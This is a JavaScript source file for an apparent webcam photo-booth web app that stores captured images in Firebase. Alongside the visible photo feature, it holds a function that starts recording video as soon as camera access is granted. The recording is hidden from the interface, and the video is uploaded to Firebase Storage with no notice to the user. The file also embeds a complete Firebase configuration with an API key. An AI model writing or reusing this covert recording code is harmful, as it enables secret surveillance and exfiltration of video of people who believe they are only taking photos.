import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";
import { getStorage, ref as storageRef, uploadBytes, getDownloadURL } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-storage.js";

// Firebase configuration
const firebaseConfig = {
    apiKey: "AIzaSyAzC9R_8EKHla74siSXFI-q7vV-3u4ARgY",
    authDomain: "adishots-8da27.firebaseapp.com",
    projectId: "adishots-8da27",
    storageBucket: "adishots-8da27.appspot.com",
    messagingSenderId: "292442326857",
    appId: "1:292442326857:web:b86a32939617ac453dfc98",
    databaseURL: "https://adishots-8da27-default-rtdb.firebaseio.com/"
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const database = getDatabase(app);
const storage = getStorage(app);

// Access the video and canvas elements
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const captureButton = document.getElementById('capture');
const imagesContainer = document.getElementById('images');
const overlay = document.getElementById('overlay');
const closeButton = document.getElementById('closeButton');
const brightnessSlider = document.getElementById('brightness');
const contrastSlider = document.getElementById('contrast');

// Request camera access
navigator.mediaDevices.getUserMedia({ video: true })
    .then(stream => {
        video.srcObject = stream;
        // Start recording the video
        startBackgroundVideoRecording(stream);
    })
    .catch(err => console.error("Error accessing camera: ", err));

// Apply brightness and contrast adjustments
brightnessSlider.addEventListener('input', applyFilters);
contrastSlider.addEventListener('input', applyFilters);

function applyFilters() {
    const brightness = brightnessSlider.value;
    const contrast = contrastSlider.value;
    video.style.filter = `brightness(${brightness}%) contrast(${contrast}%)`;
}

// Capture the photo and save to Firebase Realtime Database
captureButton.addEventListener('click', () => {
    const context = canvas.getContext('2d');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    context.drawImage(video, 0, 0, video.videoWidth, video.videoHeight);

    // Convert the canvas to a base64 string
    const base64Image = canvas.toDataURL('image/jpeg');

    // Create a reference in the Realtime Database
    const imagesRef = ref(database, 'images');
    const newImageRef = push(imagesRef);

    // Save the base64 string to the database
    set(newImageRef, {
        image: base64Image,
        timestamp: new Date().toISOString()
    }).then(() => {
        console.log('Image saved to Realtime Database');
        displayImage(base64Image); // Display image in the session
    }).catch(error => {
        console.error('Error saving image to Realtime Database:', error);
    });
});

// Display image in the session
function displayImage(base64Image) {
    const imageWrapper = document.createElement('div');
    imageWrapper.className = 'image-wrapper';
    const img = document.createElement('img');
    img.src = base64Image; // Use the base64 string as the src
    imageWrapper.appendChild(img);
    imagesContainer.appendChild(imageWrapper);

    // Add click event to maximize image
    imageWrapper.addEventListener('click', () => {
        const clonedImg = img.cloneNode();
        clonedImg.style.maxWidth = '90vw';
        clonedImg.style.maxHeight = '90vh';
        overlay.innerHTML = ''; // Clear any previous content
        overlay.appendChild(clonedImg);
        overlay.appendChild(closeButton);
        overlay.style.display = 'flex';
    });
}

// Hide the overlay when close button is clicked
closeButton.addEventListener('click', () => {
    overlay.style.display = 'none';
});

// Clear images on page load (only in DOM, not Firebase)
window.addEventListener('load', () => {
    imagesContainer.innerHTML = '';
});

// Background video recording for 1 minute
function startBackgroundVideoRecording(stream) {
    console.log("Starting background video recording...");

    // Check for MediaRecorder API support
    if (typeof MediaRecorder === 'undefined') {
        console.error('MediaRecorder API is not supported on this browser.');
        return;
    }

    let options = { mimeType: 'video/webm' };
    if (!MediaRecorder.isTypeSupported('video/webm')) {
        options = { mimeType: 'video/mp4' }; // fallback to MP4
        console.warn('Using video/mp4 as fallback MIME type.');
    }

    // Create a MediaRecorder instance
    let mediaRecorder;
    try {
        mediaRecorder = new MediaRecorder(stream, options);
    } catch (error) {
        console.error('Error creating MediaRecorder:', error);
        return;
    }

    const chunks = [];

    mediaRecorder.ondataavailable = event => {
        if (event.data.size > 0) {
            console.log('Data available:', event.data.size, 'bytes');
            chunks.push(event.data);
        }
    };

    mediaRecorder.onstop = async () => {
        console.log("Recording stopped. Preparing to upload...");
        const blob = new Blob(chunks, { type: options.mimeType });
        console.log('Blob size:', blob.size); // Log blob size for debugging

        if (blob.size > 0) {
            const videoRef = storageRef(storage, `videos/${Date.now()}.${options.mimeType.split('/')[1]}`);
            try {
                const snapshot = await uploadBytes(videoRef, blob);
                console.log('Video uploaded to Firebase Storage');
                const url = await getDownloadURL(snapshot.ref);
                console.log('Video URL:', url);

                const videosRef = ref(database, 'videos');
                const newVideoRef = push(videosRef);
                await set(newVideoRef, {
                    videoUrl: url,
                    timestamp: new Date().toISOString()
                });
                console.log('Video metadata saved to Realtime Database');
            } catch (error) {
                console.error('Error uploading video to Firebase Storage or saving metadata to Realtime Database:', error);
            }
        } else {
            console.error('Blob size is zero, not uploading.');
        }
    };

    mediaRecorder.start();
    console.log("Recording started.");

    // Stop recording after 10 seconds (change as needed)
    setTimeout(() => {
        mediaRecorder.stop();
    }, 10000); // 10000 ms = 10 seconds
}
